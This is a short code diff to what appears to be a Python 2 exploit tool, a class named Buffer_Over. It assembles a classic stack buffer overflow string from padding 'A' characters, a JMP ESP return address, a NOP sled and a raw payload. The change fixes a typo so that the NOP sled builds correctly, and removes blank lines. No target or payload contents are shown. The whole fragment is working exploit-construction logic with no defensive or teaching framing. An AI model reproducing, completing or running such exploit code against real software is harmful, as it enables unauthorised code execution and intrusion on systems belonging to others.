@@ -131,7 +131,7 @@ class Buffer_Over:
                    Strat_string = self.location *"A"
          
                    NO_Operation =  len(self.Requst_String) - self.location 
-                   NO_Operation =  NO_oprion*"\\x90"
+                   NO_Operation =  NO_Operation *"\\x90"
           
                    attack = Strat_string + self.jump_address + NO_Operation + self.payload_raw
                    print '\n[+] attack =' ,len(Strat_string),'of "A" + JMP ESP ', self.jump_address ,'+',len(NO_Operation),'of "\\x90" +',self.payload
@@ -149,10 +149,7 @@ class Buffer_Over:
 	        except Exception:
                    print "\n[+]something goes wrong try again..!!**!! "
 
-     
-
-
-
+    
 
 if __name__ == '__main__':
      Buffer_Over()
